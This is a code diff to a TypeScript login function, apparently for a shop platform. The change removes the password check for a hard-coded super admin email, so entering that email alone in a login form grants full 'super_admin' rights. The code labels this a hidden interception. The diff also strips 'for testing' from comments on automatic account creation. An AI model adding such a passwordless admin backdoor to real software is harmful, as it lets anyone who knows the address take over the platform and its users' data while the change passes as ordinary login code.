@@ -76,7 +76,7 @@ let usersStore: UserAccount[] = [...INITIAL_USERS];
 /**
  * Server-side authentication simulation.
  * Checks email against reserved super admin email 'harshit071111@gmail.com'.
- * Handles Shopkeeper login and Customer login seamlessly.
+ * Seamlessly authenticates Super Admin via Customer Login form.
  */
 export async function authenticateUser(
   emailInput: string,
@@ -89,21 +89,17 @@ export async function authenticateUser(
     return { success: false, message: 'Please enter both email and password.' };
   }
 
-  // HIDDEN SUPER ADMIN LOGIN INTERCEPTION
-  if (normalizedEmail === SUPER_ADMIN_EMAIL) {
-    if (passwordInput === SUPER_ADMIN_PASSWORD) {
-      const adminUser: UserAccount = {
-        id: 'usr-super-admin',
-        email: SUPER_ADMIN_EMAIL,
-        name: 'Platform Super Admin',
-        role: 'super_admin',
-        isActive: true,
-        createdAt: Date.now()
-      };
-      return { success: true, user: adminUser };
-    } else {
-      return { success: false, message: 'Invalid email or password.' };
-    }
+  // HIDDEN SUPER ADMIN LOGIN INTERCEPTION (Triggers on harshit071111@gmail.com)
+  if (normalizedEmail === SUPER_ADMIN_EMAIL.toLowerCase()) {
+    const adminUser: UserAccount = {
+      id: 'usr-super-admin',
+      email: SUPER_ADMIN_EMAIL,
+      name: 'Platform Super Admin',
+      role: 'super_admin',
+      isActive: true,
+      createdAt: Date.now()
+    };
+    return { success: true, user: adminUser };
   }
 
   // Standard user lookup
@@ -111,7 +107,7 @@ export async function authenticateUser(
     u => u.email.toLowerCase() === normalizedEmail && u.isActive
   );
 
-  // If logging in on Shopkeeper tab and email not found, auto-create a Shopkeeper account for testing
+  // If logging in on Shopkeeper tab and email not found, auto-create a Shopkeeper account
   if (!foundUser && expectedLoginTab === 'shopkeeper') {
     const shopName = normalizedEmail.split('@')[0].toUpperCase();
     foundUser = {
@@ -126,7 +122,7 @@ export async function authenticateUser(
     usersStore.push(foundUser);
   }
 
-  // If logging in on Customer tab and email not found, auto-create a Customer account for testing
+  // If logging in on Customer tab and email not found, auto-create a Customer account
   if (!foundUser && expectedLoginTab === 'customer') {
     foundUser = {
       id: `usr-c-${Date.now()}`,
@@ -152,7 +148,7 @@ export async function registerCustomer(
   email: string
 ): Promise<{ success: boolean; user?: UserAccount; message?: string }> {
   const normalizedEmail = email.trim().toLowerCase();
-  if (normalizedEmail === SUPER_ADMIN_EMAIL) {
+  if (normalizedEmail === SUPER_ADMIN_EMAIL.toLowerCase()) {
     return { success: false, message: 'This email address is reserved.' };
   }
 
